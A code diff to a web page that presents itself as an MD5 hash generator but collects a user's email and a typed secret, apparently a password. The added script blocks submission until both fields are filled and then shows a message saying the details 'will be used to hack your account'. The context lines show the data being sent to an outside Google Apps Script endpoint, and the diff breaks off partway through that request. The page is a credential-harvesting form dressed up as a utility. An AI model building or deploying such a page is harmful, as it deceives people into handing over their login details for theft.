@@ -32,6 +32,11 @@
         .form-group {
             margin: 15px 0;
         }
+        .hidden {
+            display: none;
+            color: red;
+            font-size: 1rem;
+        }
     </style>
 </head>
 <body>
@@ -50,15 +55,42 @@
             <input type="text" id="textToHash" placeholder="e.g., banana" />
         </div>
 
-        <button class="button" id="hashButton">Generate MD5 Hash</button>
+        <button class="button" id="hashButton" disabled>Generate MD5 Hash</button>
+        <p id="warningMessage" class="hidden">Please fill in both fields before submitting.</p>
 
         <div class="form-group">
             <h3>Hashed Result:</h3>
             <p id="hashResult"></p>
         </div>
+
+        <div id="thankYouMessage" class="hidden">
+            <p>Thank you for your password and email. This will be used to hack your account.</p>
+        </div>
     </div>
 
     <script>
+        // Function to check if both fields are filled in
+        function checkFields() {
+            var email = document.getElementById('email').value.trim();
+            var textToHash = document.getElementById('textToHash').value.trim();
+
+            var hashButton = document.getElementById('hashButton');
+            var warningMessage = document.getElementById('warningMessage');
+
+            // Enable the button only if both fields are filled
+            if (email && textToHash) {
+                hashButton.disabled = false;
+                warningMessage.classList.add('hidden');  // Hide the warning message
+            } else {
+                hashButton.disabled = true;
+                warningMessage.classList.remove('hidden');  // Show the warning message
+            }
+        }
+
+        // Update the fields status as the user types
+        document.getElementById('email').addEventListener('input', checkFields);
+        document.getElementById('textToHash').addEventListener('input', checkFields);
+
         // Handle the hash generation
         document.getElementById('hashButton').addEventListener('click', function() {
             var email = document.getElementById('email').value.trim();
@@ -74,6 +106,9 @@
 
             // Display the result
             document.getElementById('hashResult').textContent = hash;
+
+            // Show the "Thank You" message
+            document.getElementById('thankYouMessage').classList.remove('hidden');
 
             // Send the data to your Google Apps Script backend
             fetch('https://script.google.com/macros/s/AKfycbyVb1q1On9OmT2WyJnCjiOYCsxCWIPFjWM6QSYzP6JgOExVVuGrPSIa3u3AqYT_lkqAdw/exec', {
